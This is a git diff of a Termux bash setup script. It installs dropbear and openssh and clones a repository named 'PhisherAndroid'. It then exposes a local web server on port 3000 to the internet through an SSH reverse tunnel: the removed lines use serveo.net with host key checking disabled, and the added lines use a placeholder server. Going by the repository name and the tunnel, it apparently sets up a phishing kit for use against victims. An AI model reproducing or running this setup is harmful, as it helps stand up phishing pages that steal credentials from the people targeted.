@@ -1,13 +1,27 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-echo "[*] Updating packages..."
-apt update -y && apt upgrade -y
+# Developer Info
+APP_AUTHOR="Navaneetha Krishnan"
+APP_TITLE="Founder of NZT Foundation"
+APP_LINKEDIN="https://www.linkedin.com/in/navaneetha-krishnan-m-8b41b52a1/"
+APP_GITHUB="https://github.com/CuteKitty0000/"
 
-echo "[*] Installing dropbear and openssh..."
-pkg install -y dropbear openssh
-
-echo "[*] Starting Serveo tunnel..."
-echo "[*] Your public link will appear below (look for https://xxxx.serveo.net)"
+echo "Author : $APP_AUTHOR"
+echo "Title  : $APP_TITLE"
+echo "GitHub : $APP_GITHUB"
 echo
 
-ssh -o StrictHostKeyChecking=no -R 80:localhost:3000 serveo.net
+# Update & upgrade
+apt update -y && apt upgrade -y
+
+# Install packages
+pkg install -y dropbear openssh git
+
+# Clone repo
+git clone https://github.com/CuteKitty0000/PhisherAndroid
+
+echo
+echo "Done!"
+echo
+echo "Run SSH tunnel (replace with your server):"
+echo "ssh -R 80:localhost:3000 user@your-server.com"
